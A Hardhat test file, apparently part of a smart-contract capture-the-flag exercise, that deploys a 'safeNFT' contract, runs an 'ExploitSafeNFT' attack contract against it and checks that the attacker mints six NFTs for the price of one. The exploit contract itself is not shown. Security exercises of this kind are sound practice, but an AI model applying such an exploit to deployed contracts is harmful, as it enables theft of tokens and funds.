const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

describe("Exploit safeNFT Contract", function () {
    before(async () => {
        // deploying the target contract
        const SafeNFT = await ethers.getContractFactory("safeNFT");
        safeNFT_contract = await SafeNFT.deploy('safeNFT', 'sNFT', ethers.utils.parseEther('0.01'));
    })
    it("Exploiter deploys the ExploitSafeNFT contract and calls the attack() function", async () => {
        // Deploying the ExploitSafeNFT contract
        const Exploit = await ethers.getContractFactory("ExploitSafeNFT");
        exploit_contract = await Exploit.deploy(safeNFT_contract.address);
        // Attack the safeNFT contract by calling the attack function with 0.01 eth value
        await exploit_contract.attack({ value: ethers.utils.parseEther('0.01') });
    })
    it('Attack should be successful: Exploiter contract should have claimed multiple NFTs', async () => {
        const exploiter_contract_bal = await safeNFT_contract.balanceOf(exploit_contract.address);
        // Exploiter contract should have claimed 6 NFTs for the price of 1
        expect(exploiter_contract_bal).to.equal(BigNumber.from('6'));
    })
});
